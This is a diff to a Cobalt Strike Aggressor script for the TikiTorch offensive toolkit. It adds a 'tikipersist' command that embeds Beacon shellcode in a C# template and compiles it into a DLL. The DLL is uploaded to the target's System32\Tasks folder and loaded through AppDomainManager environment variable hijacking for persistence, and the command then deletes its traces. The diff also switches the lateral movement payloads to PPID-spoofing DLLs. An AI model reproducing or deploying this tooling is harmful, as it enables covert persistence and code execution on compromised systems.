@@ -1,23 +1,29 @@
 global('$WMI::AssemblyPath');
 global('$CsExec::AssemblyPath');
 global('$CsDCOM::AssemblyPath');
-global('$TikiSpawn::DllPath');
+global('$CsEnv::AssemblyPath');
+global('$TikiSpawnWOppid::DllPath');
+global('$TikiSpawnWppid::DllPath');
 global('$TikiSpawn::XmlPath');
 global('$TikiService::AssemblyPath');
 global('$TikiService::ConfigPath');
 global('$TikiCompiler::XmlPath');
 global('$TikiCompiler::CSPath');
+global('$TikiManifest::CSPath');
 
 $CsWMI::AssemblyPath = "D:\\Tools\\MiscTools\\CsWMI\\bin\\Release\\CsWMI.exe";
 $CsExec::AssemblyPath = "D:\\Tools\\MiscTools\\CsExec\\bin\\Release\\CsExec.exe";
 $CsDCOM::AssemblyPath = "D:\\Tools\\MiscTools\\CsDCOM\\bin\\Release\\CsDCOM.exe";
-$TikiSpawn::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.dll";
+$CsEnv::AssemblyPath = "D:\\Tools\\MiscTools\\CsEnv\\bin\\Release\\CsEnv.exe";
+$TikiSpawnWppid::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawnWppid.dll";
+$TikiSpawnWOppid::DllPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawnWOppid.dll";
 $TikiSpawn::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.xml";
 $TikiSpawn::PshPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.ps1";
 $TikiService::AssemblyPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe";
 $TikiService::ConfigPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe.config";
 $TikiCompiler::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler.txt";
 $TikiCompiler::CSPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler";
+$TikiManifest::CSPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiManifest.cs";
 
 if(!-exists $CsWMI::AssemblyPath) {
     show_error("WMI assembly not found!");
@@ -29,7 +35,12 @@ if(!-exists $CsExec::AssemblyPath) {
     exit();
 }
 
-if(!-exists $TikiSpawn::DllPath) {
+if(!-exists $CsEnv::AssemblyPath) {
+    show_error("CsEnv assembly not found!");
+    exit();
+}
+
+if(!-exists $TikiSpawnWOppid::DllPath) {
     show_error("TikiSpawn DLL not found!");
     exit();
 }
@@ -131,9 +142,9 @@ alias tikilateral {
 	## Prep Payload ##
 	##################
 
-	if ($payload eq "msbuild") { $final = msbuild_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::XmlPath); }
-	else if ($payload eq "powershell") { $final = powershell_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::PshPath); }
-	else if ($payload eq "workflowcompiler") { $final = compilerworkflow_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiCompiler::CSPath); }
+	if ($payload eq "msbuild") { $final = msbuild_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiSpawn::XmlPath); }
+	else if ($payload eq "powershell") { $final = powershell_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiSpawn::PshPath); }
+	else if ($payload eq "workflowcompiler") { $final = compilerworkflow_data_swap($binary, $shellcode, $TikiSpawnWOppid::DllPath, $TikiCompiler::CSPath); }
 
 	####################
 	## Upload and Run ##
@@ -276,6 +287,111 @@ alias tikiexec {
 	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config");
 }
 
+alias tikipersist {
+
+$bid = $1;
+
+	$input = substr($0, 12);
+	@args = split(' ', $input);
+
+	#########################
+	## Check args[] length ##
+	#########################
+
+	if (size(@args) eq "4") {
+
+		$listener = @args[0];
+		$arch = @args[1];
+		$binary = @args[2];
+		$method = @args[3];
+	}
+
+	############
+	## Errors ##
+	############
+
+	if (size(@args) ne "4") {
+		berror($bid, "Invalid number of arguments");
+		return;
+	}
+
+	if (listener_info($listener, "payload") eq "") {
+		berror($bid, "Invalid listener");
+		return;
+	}
+
+	if (($arch ne "x64") && ($arch ne "x86")) {
+		berror($bid, "Invalid architecture");
+		return;
+	}
+
+	if (($method ne "manifest")) {
+		berror($bid, "Invalid method");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to persist with " . listener_describe($listener) . " and " . $method);
+
+	###############
+	## Shellcode ##
+	###############
+
+	artifact_stageless($listener, "raw", $arch, $null, $this);
+	yield;
+	$shellcode = base64_encode($1);
+
+	##################
+	## Prep Payload ##
+	##################
+
+	if ($method eq "manifest") {
+		$final = manifest_data_swap($binary, $shellcode, $TikiSpawnWppid::DllPath, $TikiManifest::CSPath);
+
+		$handle = openf(">C:\\Windows\\Temp\\TikiManifest.cs");
+		writeb($handle, $final);
+		closef($handle);
+	}
+
+	$buildPath = "";
+	
+	if ($arch eq "x64") { $buildPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"; }
+	else { $buildPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"; }
+
+	$buildCmd = $buildPath . " /target:library /unsafe /out:C:\\Windows\\Temp\\tasks.dll C:\\Windows\\Temp\\TikiManifest.cs";
+
+	$process = exec("cmd.exe /c \"$buildCmd\"");
+    @data = readAll($process);
+    printAll(@data);
+    closef($process);
+
+    ####################
+	## Upload and Run ##
+	####################
+
+	if ($method eq "manifest") {
+
+		$handle = openf("C:\\Windows\\Temp\\tasks.dll");
+		$dll = readb($handle, -1);
+		closef($handle);
+
+		bupload_raw!($bid, "c:\\windows\\system32\\tasks\\tasks.dll", $dll);
+
+		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "APPDOMAIN_MANAGER_ASM \"tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\" user");
+		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "APPDOMAIN_MANAGER_TYPE TikiTorchDomainManager user");
+		bexecute_assembly!($bid, $CsEnv::AssemblyPath, "COMPLUS_Version v4.0.30319 user");
+	}
+
+	#############
+	## Cleanup ##
+	#############
+
+	$process = exec("cmd.exe /c \"del C:\\Windows\\Temp\\TikiManifest.cs && del C:\\Windows\\Temp\\tasks.dll\"");
+    @data = readAll($process);
+    printAll(@data);
+    closef($process);
+
+}
+
 sub msbuild_data_swap {
 	
 	$binary = $1;
@@ -372,6 +488,39 @@ sub compilerworkflow_data_swap {
 	return $data;
 }
 
+sub manifest_data_swap {
+	
+	$binary = $1;
+	$shellcode = $2;
+	$dllPath = $3;
+	$template = $4;
+
+	$handle = openf($dllPath);
+	$dll = base64_encode(readb($handle, -1));
+
+	if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[16]);
+		add(@data, "	static string dll = \"$dll\"\;", 16);
+		remove(@data, @data[17]);
+		add(@data, "	static string binary = \@\"$binary\";", 17);
+		remove(@data, @data[18]);
+		add(@data, "	static string shellcode = \"$shellcode\"\;", 18);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++) {
+			$data = $data . @data[$i] . "\r\n";
+		}
+
+	}
+
+	return $data;
+}
+
 sub tikiexec_data_swap {
 	
 	$binary = $1;
@@ -424,4 +573,15 @@ beacon_command_register (
 	"Copy a TikiTorch payload to the remote target\n" .
 	"and execute it using the Service Control Manager.\n\n" .
 	"Use: tikiexec [target] [listener] [x64|x86] [binary]"
+);
+
+beacon_command_register (
+
+	"tikipersist",
+	"Persist on a host with a TikiTorch payload",
+	"Install a persistence mechanism on the target using\n" .
+	"a TikiTorch payload and the specified method.\n\n" .
+	"Use: tikipersist [listener] [x64|x86] [binary] [method]\n\n" .
+	"     Methods: manifest\n\n" .
+	"Example: tikipersist http x64 c:\\windows\\notepad.exe manifest"
 );
